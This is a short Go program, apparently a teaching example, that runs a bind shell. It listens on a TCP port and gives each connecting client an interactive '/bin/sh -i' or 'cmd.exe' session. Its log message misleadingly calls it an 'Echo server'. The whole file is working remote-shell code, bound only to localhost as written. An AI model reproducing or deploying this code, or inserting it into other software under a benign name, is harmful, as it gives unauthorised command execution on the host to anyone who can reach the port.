package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (f *Flusher) Write(b []byte) (int, error) {
	count, err := f.w.Write(b)
	if err != nil {
		log.Fatalln("Unable to write to buffer")
		return -1, err
	}

	if err := f.w.Flush(); err != nil {
		log.Fatalln("Unable to flush buffer.")
		return -1, err
	}
	return count, err
}

func handleWithFlusher(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func handleWithPipe(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	port_arg := flag.Uint("port", 8080, "Port number to listen on.")
	flag.Parse()

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", *port_arg))
	if err != nil {
		log.Fatalln("Error listening: ", err)
		os.Exit(1)
	}

	defer listener.Close()
	log.Printf("Echo server is listening on port %d \n", *port_arg)
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Error accepting connection:", err)
			continue
		}

		go handleWithPipe(conn)
	}
}
